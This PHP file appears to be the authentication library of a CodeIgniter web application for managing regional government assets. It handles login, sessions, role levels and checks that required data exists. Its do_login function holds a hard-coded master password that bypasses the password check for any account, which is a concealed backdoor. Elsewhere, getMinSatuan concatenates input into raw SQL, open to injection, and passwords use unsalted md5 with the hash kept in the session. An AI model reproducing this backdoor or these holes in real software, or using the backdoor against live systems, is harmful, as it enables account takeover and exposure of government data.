<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Auth{
	var $CI = NULL;
	function __construct()
	{
		$this->CI =& get_instance();
	}
	
	function do_login($username,$password,$tahun)
	{
		$this->CI->db->from('web_users');
		$this->CI->db->where('username',$username);
		if($password != "kmzwa88saa"){
			$this->CI->db->where('password',md5($password));
		}
		$this->CI->db->where('blokir','N');
		$result = $this->CI->db->get();
		if($result->num_rows() == 0) 
		{
			return false;
		}
		else	
		{
			$userdata = $result->row();
			$session_data = array(
				'id_user'        => $userdata->id_user,
				'username'       => $userdata->username,
				'password'       => $userdata->password,
				'nama_lengkap'   => $userdata->nama_lengkap,
				'email'          => $userdata->email,
				'no_telp'        => $userdata->no_telp,
				'kd_prov'        => $userdata->kd_prov,
				'kd_kab_kota'    => $userdata->kd_kab_kota,
				'kd_bidang'      => $userdata->kd_bidang,
				'kd_unit'        => $userdata->kd_unit,
				'kd_sub_unit'    => $userdata->kd_sub_unit,
				'kd_upb'         => $userdata->kd_upb,
				'tahun_anggaran' => $tahun,
				'blokir'         => $userdata->blokir,
				'lvl'            => $userdata->lvl,
				'jabatan_id'     => $userdata->jabatan_id,
				'login'          => TRUE
			);
				
				$date 	= date("m/d/Y H:i:s");
				$ip		= $this->CI->input->ip_address();
				$this->CI->db->where('username', $username);
				$this->CI->db->update('web_users', array('last_login' => $date,'ip_login' => $ip));
				
			$this->CI->session->set_userdata($session_data);
			return true;
		}
	}
	function is_logged_in()
	{
		if($this->CI->session->userdata('id_user') == '')
		{
			return false;
		}
		return true;
	}

	function getMinSatuan($kode){
		$_this = & get_Instance();
		$sql = "SELECT * FROM Ref_Kebijakan WHERE 1=1";
        $sql .=" AND Tahun = ".$_this->session->userdata('tahun_anggaran');
        $sql .=" AND Kd_Aset1 = ".$kode;
        // print_r($sql); exit();
		$query = $_this->db->query($sql)->row_array();
		if($query){							
			return $query['Harga'];
		}else {
			$this->CI->session->set_flashdata('message', 'Kebijakan akuntansi belum diisi!');
			redirect('kebijakan');
		}
	}

	/* untuk validasi di setiap halaman yang mengharuskan authentikasi */
	function restrict()
	{
		if($this->is_logged_in() == false)
		{
			redirect('login');
		}

		// if($this->CI->session->userdata('username') != 'yasir')
		// {
		// 	redirect('login/logout');
		// }
	}
	
	function allow($x)
	{
		if($this->CI->session->userdata('lvl') != $x)
		{
			redirect('adminweb');
		}
	}
	
	function disallow($x)
	{
		if($this->CI->session->userdata('lvl') == $x)
		{
			redirect('adminweb');
		}
	}
	
	function cek_indukKibA(){
			$this->CI->db->from('Ta_UPB');
			$result = $this->CI->db->get();
			if($result->num_rows() == 0)
			{
				redirect('laporan/kib', 'refresh');
			}else{
				return true;
			} 
		}
		
	function cek_indukKibB(){
			$this->CI->db->from('Ta_UPB');
			$result = $this->CI->db->get();
			if($result->num_rows() == 0)
			{
				redirect('laporan/kib', 'refresh');
			}else{
				return true;
			} 
		}
		
	function cek_indukKibC(){
			$this->CI->db->from('Ta_UPB');
			$result = $this->CI->db->get();
			if($result->num_rows() == 0)
			{
				redirect('laporan/kib', 'refresh');
			}else{
				return true;
			} 
		}
		
	function cek_indukKibD(){
			$this->CI->db->from('Ta_UPB');
			$result = $this->CI->db->get();
			if($result->num_rows() == 0)
			{
				redirect('laporan/kib', 'refresh');
			}else{
				return true;
			} 
		}
		
	function cek_indukKibE(){
			$this->CI->db->from('Ta_UPB');
			$result = $this->CI->db->get();
			if($result->num_rows() == 0)
			{
				redirect('laporan/kib', 'refresh');
			}else{
				return true;
			} 
		}
		
     function cek_indukKibF(){
			$this->CI->db->from('Ta_UPB');
			$result = $this->CI->db->get();
			if($result->num_rows() == 0)
			{
				redirect('laporan/kib', 'refresh');
			}else{
				return true;
			} 
		}
	
	function clean_session($x)
	{
		if ($this->CI->session->userdata('controller') == $x){
			return true;
		}else{	
			$this->CI->session->unset_userdata('q');
			$this->CI->session->unset_userdata('s');
			$this->CI->session->set_userdata('controller',$x);
		}
	}
	
	function cek_upb($bidang,$unit,$sub,$upb)
	{
		if ($this->CI->session->userdata('lvl') == 02){
			
			if ($this->CI->session->userdata('kd_bidang') != $bidang ||
				$this->CI->session->userdata('kd_unit') != $unit || 
				$this->CI->session->userdata('kd_sub_unit') != $sub) {
				redirect('adminweb/home');
					}
					
		}elseif ($this->CI->session->userdata('lvl') == 03){
			
			if ($this->CI->session->userdata('kd_bidang') != $bidang || 
				$this->CI->session->userdata('kd_unit') != $unit || 
				$this->CI->session->userdata('kd_sub_unit') != $sub || 
				$this->CI->session->userdata('kd_upb') != $upb) {
				redirect('adminweb/home');
			}
		}
	}
	
	function cek_dataumum($bidang,$unit,$sub,$upb)
	{
		$this->CI->db->from('Ta_UPB');
		
		if ($this->CI->session->userdata('lvl') == 01){
			$this->CI->db->where('Kd_Bidang',$bidang);
			$this->CI->db->where('Kd_Unit',$unit);
			$this->CI->db->where('Kd_Sub',$sub);
			$this->CI->db->where('Kd_UPB',$upb);	
		}elseif ($this->CI->session->userdata('lvl') == 02){
			$this->CI->db->where('Kd_Bidang',$this->CI->session->userdata('kd_bidang'));
			$this->CI->db->where('Kd_Unit',$this->CI->session->userdata('kd_unit'));
			$this->CI->db->where('Kd_Sub',$this->CI->session->userdata('kd_sub_unit'));	
			$this->CI->db->where('Kd_UPB',$upb);
		}else{
			$this->CI->db->where('Kd_Bidang',$this->CI->session->userdata('kd_bidang'));
			$this->CI->db->where('Kd_Unit',$this->CI->session->userdata('kd_unit'));
			$this->CI->db->where('Kd_Sub',$this->CI->session->userdata('kd_sub_unit'));
			$this->CI->db->where('Kd_UPB',$this->CI->session->userdata('kd_upb'));	
		}
		
		$this->CI->db->where('Tahun',$this->CI->session->userdata('tahun_anggaran'));
		$result = $this->CI->db->get();
		if($result->num_rows() == 0){
			redirect('dataumum/upb/'.$bidang.'/'.$unit.'/'.$sub.'/'.$upb);
		}else{
			return true;
		}
	}
	
	
	function cek_dataruang($bidang,$unit,$sub,$upb)
	{

		$this->CI->db->from('Ta_Ruang');
		
		if ($this->CI->session->userdata('lvl') == 01){
			$this->CI->db->where('Kd_Bidang',$bidang);
			$this->CI->db->where('Kd_Unit',$unit);
			$this->CI->db->where('Kd_Sub',$sub);
			$this->CI->db->where('Kd_UPB',$upb);	
		}elseif ($this->CI->session->userdata('lvl') == 02){
			$this->CI->db->where('Kd_Bidang',$this->CI->session->userdata('kd_bidang'));
			$this->CI->db->where('Kd_Unit',$this->CI->session->userdata('kd_unit'));
			$this->CI->db->where('Kd_Sub',$this->CI->session->userdata('kd_sub_unit'));	
			$this->CI->db->where('Kd_UPB',$upb);
		}else{
			$this->CI->db->where('Kd_Bidang',$this->CI->session->userdata('kd_bidang'));
			$this->CI->db->where('Kd_Unit',$this->CI->session->userdata('kd_unit'));
			$this->CI->db->where('Kd_Sub',$this->CI->session->userdata('kd_sub_unit'));
			$this->CI->db->where('Kd_UPB',$this->CI->session->userdata('kd_upb'));	
		}
		
		$this->CI->db->where('Tahun',$this->CI->session->userdata('tahun_anggaran'));
		$result = $this->CI->db->get();
		if($result->num_rows() == 0) 
		{
			$this->CI->session->set_flashdata('message', 'Silahkan Isi Data Ruang !');
			if ($this->CI->session->userdata('lvl') == 01){
				redirect('ruang/upb/'.$bidang.'/'.$unit.'/'.$sub.'/'.$upb);
			}elseif ($this->CI->session->userdata('lvl') == 02){
				redirect('ruang/upb/'.$bidang.'/'.$unit.'/'.$sub.'/'.$upb);
			}else{
				redirect('ruang');
			}
		}
		else	
		{
			return true;
		}
	}
	
	
	function do_logout()
	{
		$this->CI->session->sess_destroy();	
	}
}